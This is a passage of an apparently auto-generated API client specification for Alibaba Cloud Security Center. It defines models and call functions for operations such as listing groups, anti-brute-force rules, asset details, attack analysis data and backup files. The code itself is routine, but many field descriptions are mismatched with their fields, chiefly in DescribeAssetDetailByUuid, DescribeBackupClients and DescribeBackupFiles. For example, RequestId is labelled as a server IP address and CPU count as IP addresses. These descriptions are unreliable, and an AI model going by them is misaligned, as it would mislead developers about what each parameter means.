  requestId?: string(name='RequestId', description='The IP address of the server.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeAllEntityResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAllEntityResponseBody(name='body'),
}

async function describeAllEntityWithOptions(runtime: Util.RuntimeOptions): DescribeAllEntityResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAllEntity',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAllEntity(): DescribeAllEntityResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAllEntityWithOptions(runtime);
}

model DescribeAllGroupsRequest {
  lang?: string(name='Lang', example='zh'),
}

model DescribeAllGroupsResponseBody = {
  count?: int32(name='Count', example='2'),
  groups?: [ 
    {
      groupFlag?: int32(name='GroupFlag', example='1'),
      groupId?: int32(name='GroupId', example='8834224'),
      groupName?: string(name='GroupName', example='abc'),
    }
  ](name='Groups'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeAllGroupsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAllGroupsResponseBody(name='body'),
}

async function describeAllGroupsWithOptions(request: DescribeAllGroupsRequest, runtime: Util.RuntimeOptions): DescribeAllGroupsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAllGroups',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAllGroups(request: DescribeAllGroupsRequest): DescribeAllGroupsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAllGroupsWithOptions(request, runtime);
}

model DescribeAllImageBaselineRequest {
  lang?: string(name='Lang', example='zh'),
}

model DescribeAllImageBaselineResponseBody = {
  imageBaselines?: {
    baselineClassList?: [ 
      {
        alias?: string(name='Alias'),
        baselineNameList?: [ 
          {
            alias?: string(name='Alias'),
            baselineItemList?: [ 
              {
                alias?: string(name='Alias'),
                classKey?: string(name='ClassKey', example='identification'),
                itemKey?: string(name='ItemKey', example='duplicate_pwd_hash'),
                nameKey?: string(name='NameKey', example='identification'),
              }
            ](name='BaselineItemList'),
            classKey?: string(name='ClassKey', example='identification'),
            nameKey?: string(name='NameKey', example='identification'),
          }
        ](name='BaselineNameList'),
        classKey?: string(name='ClassKey', example='identification'),
      }
    ](name='BaselineClassList'),
  }(name='ImageBaselines'),
  requestId?: string(name='RequestId', example='1A975D03-5F49-5354-B2CB-3918D5DA****'),
}

model DescribeAllImageBaselineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAllImageBaselineResponseBody(name='body'),
}

async function describeAllImageBaselineWithOptions(request: DescribeAllImageBaselineRequest, runtime: Util.RuntimeOptions): DescribeAllImageBaselineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAllImageBaseline',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAllImageBaseline(request: DescribeAllImageBaselineRequest): DescribeAllImageBaselineResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAllImageBaselineWithOptions(request, runtime);
}

model DescribeAntiBruteForceRulesRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  id?: long(name='Id', example='1141****'),
  name?: string(name='Name'),
  pageSize?: string(name='PageSize', example='10'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', example='121.69.XX.XX'),
}

model DescribeAntiBruteForceRulesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', example='2'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='2'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
  rules?: [ 
    {
      createTime?: string(name='CreateTime'),
      defaultRule?: boolean(name='DefaultRule', example='true'),
      enableSmartRule?: boolean(name='EnableSmartRule', example='false'),
      failCount?: int32(name='FailCount', example='15'),
      forbiddenTime?: int32(name='ForbiddenTime', example='360'),
      id?: long(name='Id', example='1629'),
      machineCount?: int32(name='MachineCount', example='3'),
      name?: string(name='Name', example='AntiBruteForceRule01'),
      span?: int32(name='Span', example='10'),
      uuidList?: [ string ](name='UuidList'),
    }
  ](name='Rules'),
}

model DescribeAntiBruteForceRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAntiBruteForceRulesResponseBody(name='body'),
}

async function describeAntiBruteForceRulesWithOptions(request: DescribeAntiBruteForceRulesRequest, runtime: Util.RuntimeOptions): DescribeAntiBruteForceRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAntiBruteForceRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAntiBruteForceRules(request: DescribeAntiBruteForceRulesRequest): DescribeAntiBruteForceRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAntiBruteForceRulesWithOptions(request, runtime);
}

model DescribeAppVulScanCycleResponseBody = {
  cycle?: string(name='Cycle', example='1week'),
  requestId?: string(name='RequestId', example='934E6D2A-0123-5A99-88BA-80DC27634E22'),
}

model DescribeAppVulScanCycleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAppVulScanCycleResponseBody(name='body'),
}

async function describeAppVulScanCycleWithOptions(runtime: Util.RuntimeOptions): DescribeAppVulScanCycleResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAppVulScanCycle',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAppVulScanCycle(): DescribeAppVulScanCycleResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAppVulScanCycleWithOptions(runtime);
}

model DescribeAssetDetailByUuidRequest {
  lang?: string(name='Lang', description='The operating system version of the server.', example='zh'),
  sourceIp?: string(name='SourceIp', description='The details of the CPU.', example='192.0.XX.XX'),
  uuid?: string(name='Uuid', description='The public IP address of the server.', example='9e6cad93-a379-46fd-a701-9bbf02f4****'),
}

model DescribeAssetDetailByUuidResponseBody = {
  assetDetail?: {
    assetType?: string(name='AssetType', description='The name of the region in which the server resides.', example='0'),
    authModifyTime?: long(name='AuthModifyTime', description='The operating system information about the server.', example='1627974044000'),
    authVersion?: int32(name='AuthVersion', description='The name of the host.', example='7'),
    bind?: boolean(name='Bind', description='The memory size of the server. Unit: MB.', example='true'),
    clientStatus?: string(name='ClientStatus', description='The name of the server.', example='online'),
    clientVersion?: string(name='ClientVersion', description='An array that consists of the information about the disk.', example='2.0.0'),
    cpu?: int32(name='Cpu', description='The IP addresses of the server.', example='2'),
    cpuInfo?: string(name='CpuInfo', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**: yes
*   **false**: no', example='Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz'),
    createTime?: long(name='CreateTime', description='The status of the Security Center agent. Valid values:

*   **pause**: The Security Center agent suspends protection for your server.
*   **online**: The Security Center agent is protecting your server.
*   **offline**: The Security Center agent does not protect your server.', example='1603863599000'),
    diskInfoList?: [ string ](name='DiskInfoList'),
    flag?: int32(name='Flag', description='The MAC addresses of the server.', example='0'),
    groupTrace?: string(name='GroupTrace', description='The ID of the server.', example='default'),
    hostName?: string(name='HostName', description='The type of the asset. Valid values:

*   **0**: ECS instance
*   **1**: Server Load Balancer (SLB) instance
*   **2**: NAT gateway
*   **3**: ApsaraDB RDS database
*   **4**: ApsaraDB for MongoDB database
*   **5**: ApsaraDB for Redis database
*   **6**: image
*   **7**: container', example='qewrqwerqs****'),
    instanceId?: string(name='InstanceId', description='The UUID of the server.', example='i-uf6h7p2fgk6rkk0g****'),
    instanceName?: string(name='InstanceName', description='The operating system type of the server.', example='i-fasdfasdfadfafa****'),
    internetIp?: string(name='InternetIp', description='The name of the operating system.', example='192.168.XX.XX'),
    intranetIp?: string(name='IntranetIp', description='The number of CPU cores.', example='192.168.XX.XX'),
    ip?: string(name='Ip', description='The private IP address of the server.', example='192.168.XX.XX'),
    ipList?: [ string ](name='IpList', description='The information about the disk. This parameter contains the following fields:

*   **diskName**: the name of the disk.
*   **totalSize**: the total amount of the disk space. Unit: GB.
*   **useSize**: the amount of the used disk space. Unit: GB.
*   **useSizeByte**: the amount of the used disk space. Unit: bytes.
*   **totalSizeByte**: the total amount of the disk space. Unit: bytes.'),
    kernel?: string(name='Kernel', description='The memory size of the server. Unit: GB.', example='4.18.0-80.11.2.el8_0.x86_64'),
    macList?: [ string ](name='MacList'),
    mem?: int32(name='Mem', description='The region in which the server resides.', example='32'),
    memory?: long(name='Memory', description='The group to which the server belongs. By default, the servers that are not grouped belong to the **Default** group.', example='512'),
    os?: string(name='Os', description='The ID of the region in which the asset resides.', example='linux'),
    osDetail?: string(name='OsDetail', description='The tag that is added to the server.', example='Linux 64bit'),
    osName?: string(name='OsName', description='The ID of the virtual private cloud (VPC) in which the server resides.', example='-'),
    region?: string(name='Region', description='The timestamp when Security Center is authorized to protect the asset. Unit: milliseconds.', example='cn-hangzhou-dg-a01'),
    regionId?: string(name='RegionId', description='Indicates whether the asset is provided by Alibaba Cloud. Valid values:

*   **0**: yes
*   **1**: no', example='cn-hanghzou'),
    regionName?: string(name='RegionName', description='The media access control (MAC) addresses of the server.', example='China (Hohhot)'),
    sysInfo?: string(name='SysInfo', description='The version of the Security Center agent.', example='CentOS Linux 8.0.1905'),
    tag?: string(name='Tag', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic edition (Unauthorized)
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='InternetIp'),
    uuid?: string(name='Uuid', description='The IP addresses of the server.', example='9e6cad93-a379-46fd-a701-9bbf02f4****'),
    vpcInstanceId?: string(name='VpcInstanceId', description='The IP address that is assigned to the Elastic Compute Service (ECS) instance.', example='vpc-bp1fs3bwonlfq503w****'),
  }(name='AssetDetail', description='The kernel version of the operating system.'),
  requestId?: string(name='RequestId', description='The timestamp when Security Center records the details of the server. Unit: milliseconds.', example='39031E31-6BBA-5C99-A870-D807E78918CD'),
}

model DescribeAssetDetailByUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetDetailByUuidResponseBody(name='body'),
}

async function describeAssetDetailByUuidWithOptions(request: DescribeAssetDetailByUuidRequest, runtime: Util.RuntimeOptions): DescribeAssetDetailByUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAssetDetailByUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAssetDetailByUuid(request: DescribeAssetDetailByUuidRequest): DescribeAssetDetailByUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetDetailByUuidWithOptions(request, runtime);
}

model DescribeAssetDetailByUuidsRequest {
  lang?: string(name='Lang', example='zh'),
  uuids?: string(name='Uuids', example='0687b17f-2a36-4e5****,0687b17f-2a36-4e****'),
}

model DescribeAssetDetailByUuidsResponseBody = {
  assetList?: [ 
    {
      assetType?: string(name='AssetType', example='0'),
      clientStatus?: string(name='ClientStatus', example='online'),
      flag?: int32(name='Flag', example='0'),
      instanceId?: string(name='InstanceId', example='i-rj9gda4wolo0zixi****'),
      instanceName?: string(name='InstanceName', example='TestInstanceName'),
      internetIp?: string(name='InternetIp', example='10.10.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='192.168.XX.XX'),
      ip?: string(name='Ip', example='10.10.XX.XX'),
      os?: string(name='Os', example='Linux'),
      osName?: string(name='OsName'),
      region?: string(name='Region', example='cn-guangzhou'),
      regionId?: string(name='RegionId', example='cn-shanghai'),
      regionName?: string(name='RegionName', example='cn-shenzhen'),
      uuid?: string(name='Uuid', example='2a98f149-0256-414c-a29a-a69f8a75****'),
      vpcInstanceId?: string(name='VpcInstanceId', example='13231-331331'),
    }
  ](name='AssetList'),
  requestId?: string(name='RequestId', example='92016EC8-D52D-49D8-9FF7-9EA340A950B9'),
}

model DescribeAssetDetailByUuidsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetDetailByUuidsResponseBody(name='body'),
}

async function describeAssetDetailByUuidsWithOptions(request: DescribeAssetDetailByUuidsRequest, runtime: Util.RuntimeOptions): DescribeAssetDetailByUuidsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAssetDetailByUuids',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAssetDetailByUuids(request: DescribeAssetDetailByUuidsRequest): DescribeAssetDetailByUuidsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetDetailByUuidsWithOptions(request, runtime);
}

model DescribeAssetSummaryResponseBody = {
  assetsSummary?: {
    totalAssetAllRegion?: int32(name='TotalAssetAllRegion', example='2064'),
    totalCoreAllRegion?: int32(name='TotalCoreAllRegion', example='3200'),
    totalCoreNum?: int32(name='TotalCoreNum', example='1022'),
  }(name='AssetsSummary'),
  requestId?: string(name='RequestId', example='0FA7F1F4-488D-52CA-9BFC-3E47793B49D1'),
}

model DescribeAssetSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetSummaryResponseBody(name='body'),
}

async function describeAssetSummaryWithOptions(runtime: Util.RuntimeOptions): DescribeAssetSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAssetSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAssetSummary(): DescribeAssetSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetSummaryWithOptions(runtime);
}

model DescribeAssetsSecurityEventSummaryRequest {
  clusterId?: string(name='ClusterId', example='cc58f827d893f4d7fb3e34b5d4395****'),
  containerFieldName?: string(name='ContainerFieldName', example='clusterName'),
  containerFieldValue?: string(name='ContainerFieldValue', example='arms-prom-operator'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', example='113.108.XX.XX'),
}

model DescribeAssetsSecurityEventSummaryResponseBody = {
  assets?: [ 
    {
      assetType?: string(name='AssetType', example='namespace'),
      riskCount?: long(name='RiskCount', example='16'),
      totalCount?: long(name='TotalCount', example='30'),
    }
  ](name='Assets'),
  requestId?: string(name='RequestId', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
}

model DescribeAssetsSecurityEventSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAssetsSecurityEventSummaryResponseBody(name='body'),
}

async function describeAssetsSecurityEventSummaryWithOptions(request: DescribeAssetsSecurityEventSummaryRequest, runtime: Util.RuntimeOptions): DescribeAssetsSecurityEventSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAssetsSecurityEventSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAssetsSecurityEventSummary(request: DescribeAssetsSecurityEventSummaryRequest): DescribeAssetsSecurityEventSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetsSecurityEventSummaryWithOptions(request, runtime);
}

model DescribeAttackAnalysisDataRequest {
  base64?: string(name='Base64', example='true'),
  currentPage?: int32(name='CurrentPage', example='1'),
  data?: string(name='Data', example='{"crack_type":"9"}'),
  endTime?: long(name='EndTime', example='1649040221'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='10'),
  startTime?: long(name='StartTime', example='1644027670'),
  type?: string(name='Type', example='DETAILS'),
}

model DescribeAttackAnalysisDataResponseBody = {
  data?: string(name='Data', example='[{\\"crack_hour\\":1662480000000,\\"crack_cnt\\":471},{\\"crack_hour\\":1662483600000,\\"crack_cnt\\":461},{\\"crack_hour\\":1662487200000,\\"crack_cnt\\":445},{\\"crack_hour\\":1662490800000,\\"crack_cnt\\":471},{\\"crack_hour\\":1662494400000,\\"crack_cnt\\":534},{\\"crack_hour\\":1662498000000,\\"crack_cnt\\":652},{\\"crack_hour\\":1662501600000,\\"crack_cnt\\":706},{\\"crack_hour\\":1662505200000,\\"crack_cnt\\":613},{\\"crack_hour\\":1662508800000,\\"crack_cnt\\":578},{\\"crack_hour\\":1662512400000,\\"crack_cnt\\":577},{\\"crack_hour\\":1662516000000,\\"crack_cnt\\":616},{\\"crack_hour\\":1662519600000,\\"crack_cnt\\":597},{\\"crack_hour\\":1662523200000,\\"crack_cnt\\":575},{\\"crack_hour\\":1662526800000,\\"crack_cnt\\":507}]'),
  page?: int32(name='Page', example='1'),
  pageSize?: int32(name='PageSize', example='10'),
  requestId?: string(name='RequestId', example='4C1AE3F3-18FA-4108-BBB9-AFA1A032756C'),
  total?: int32(name='Total', example='1000'),
}

model DescribeAttackAnalysisDataResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAttackAnalysisDataResponseBody(name='body'),
}

async function describeAttackAnalysisDataWithOptions(request: DescribeAttackAnalysisDataRequest, runtime: Util.RuntimeOptions): DescribeAttackAnalysisDataResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.base64)) {
    query['Base64'] = request.base64;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.data)) {
    query['Data'] = request.data;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAttackAnalysisData',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAttackAnalysisData(request: DescribeAttackAnalysisDataRequest): DescribeAttackAnalysisDataResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAttackAnalysisDataWithOptions(request, runtime);
}

model DescribeAutoDelConfigResponseBody = {
  days?: int32(name='Days', example='30'),
  requestId?: string(name='RequestId', example='C56F66FD-C4EE-4813-ABDC-4FF94B6C384E'),
}

model DescribeAutoDelConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAutoDelConfigResponseBody(name='body'),
}

async function describeAutoDelConfigWithOptions(runtime: Util.RuntimeOptions): DescribeAutoDelConfigResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAutoDelConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAutoDelConfig(): DescribeAutoDelConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAutoDelConfigWithOptions(runtime);
}

model DescribeBackUpExportInfoRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  exportType?: string(name='ExportType', description='The type of archived information. Valid values:

*   **suspiciousExport**: alert event', example='suspiciousExport'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
}

model DescribeBackUpExportInfoResponseBody = {
  data?: [ 
    {
      currentCount?: int32(name='CurrentCount', description='The number of exported entries.', example='29'),
      fileName?: string(name='FileName', description='The name of the file.', example='suspicious_event_20221203'),
      gmtCreate?: long(name='GmtCreate', description='The time when the export task was created.', example='1671607025000'),
      id?: long(name='Id', description='The ID of the export task.', example='273698***'),
      link?: string(name='Link', description='The URL at which you can download the archived information.', example='http://xxx.oss-cn-xxx.aliyuncs.com/export/assetInstance_20221221_1671606250570.zip'),
      message?: string(name='Message', description='The error message that is returned when the export task fails.', example='success'),
      progress?: int32(name='Progress', description='The progress percentage of the export task.', example='100'),
      status?: string(name='Status', description='The status of the export task. Valid values:

*   **init**: The task is being initialized.
*   **exporting**: The task is in progress.
*   **success**: The task is complete.', example='success'),
      totalCount?: int32(name='TotalCount', description='The total number of entries in the file.', example='29'),
    }
  ](name='Data', description='The data returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='29'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DescribeBackUpExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackUpExportInfoResponseBody(name='body'),
}

async function describeBackUpExportInfoWithOptions(request: DescribeBackUpExportInfoRequest, runtime: Util.RuntimeOptions): DescribeBackUpExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.exportType)) {
    query['ExportType'] = request.exportType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackUpExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackUpExportInfo(request: DescribeBackUpExportInfoRequest): DescribeBackUpExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackUpExportInfoWithOptions(request, runtime);
}

model DescribeBackupClientsRequest {
  supportRegionId?: string(name='SupportRegionId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='cn-hangzhou'),
}

model DescribeBackupClientsResponseBody = {
  clients?: [ 
    {
      clientId?: string(name='ClientId', example='c-000az2f537r73dyh****'),
      clientStatus?: string(name='ClientStatus', example='ONLINE'),
      clientVersion?: string(name='ClientVersion', example='2.0.0'),
      instanceId?: string(name='InstanceId', example='i-bp15hyph4aci99dv****'),
      uuid?: string(name='Uuid', example='22f6550d-f294-449b-b6e6-90638fd1****'),
    }
  ](name='Clients', description='DescribeBackupClients'),
  requestId?: string(name='RequestId', description='Queries the servers on which the anti-ransomware agent is installed in a specified region.', example='E3ED094C-9EB7-4239-962B-D0FB3D5F23C7'),
}

model DescribeBackupClientsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupClientsResponseBody(name='body'),
}

/**
  * The data returned.
  *
  * @param request DescribeBackupClientsRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeBackupClientsResponse
 */
async function describeBackupClientsWithOptions(request: DescribeBackupClientsRequest, runtime: Util.RuntimeOptions): DescribeBackupClientsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.supportRegionId)) {
    query['SupportRegionId'] = request.supportRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupClients',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The data returned.
  *
  * @param request DescribeBackupClientsRequest
  * @return DescribeBackupClientsResponse
 */
async function describeBackupClients(request: DescribeBackupClientsRequest): DescribeBackupClientsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupClientsWithOptions(request, runtime);
}

model DescribeBackupFilesRequest {
  currentPage?: string(name='CurrentPage', description='The UUID of the server to which an anti-ransomware policy is applied.', example='1'),
  pageSize?: string(name='PageSize', description='An array that consists of the backup files returned.', example='10'),
  path?: string(name='Path', description='The pagination information.', example='“”'),
  snapshotHash?: string(name='SnapshotHash', description='The size of the backup file. Unit: bytes.', example='a7f26223ef3974c6fac324cd37713ab65ab618859d20b4039192a5da44d77b63'),
  uuid?: string(name='Uuid', description='The number of entries to return on each page. Default value: **10**.', example='6d5b361f-958d-48a8-a9d2-d6e82c1a****'),
}

model DescribeBackupFilesResponseBody = {
  backupFiles?: [ 
    {
      name?: string(name='Name', example='Group 1'),
      size?: long(name='Size', example='100'),
      subtree?: string(name='Subtree', example='Python27\\'),
      type?: string(name='Type', example='dir'),
    }
  ](name='BackupFiles'),
  pageInfo?: {
    count?: int32(name='Count', example='10'),
    currentPage?: int32(name='CurrentPage', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1'),
    pageSize?: int32(name='PageSize', description='Queries backup files.', example='10'),
    totalCount?: int32(name='TotalCount', description='WB01014029', example='69'),
  }(name='PageInfo', description='The number of entries returned per page. Default value: **10**.'),
  requestId?: string(name='RequestId', description='The number of the page to return. Default value: **1**.', example='00A60A6D-33E0-5D5A-9B7C-E5D4DCA88148'),
}

model DescribeBackupFilesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupFilesResponseBody(name='body'),
}

async function describeBackupFilesWithOptions(request: DescribeBackupFilesRequest, runtime: Util.RuntimeOptions): DescribeBackupFilesResponse {
  Util.validateModel(request);
  var query = {};
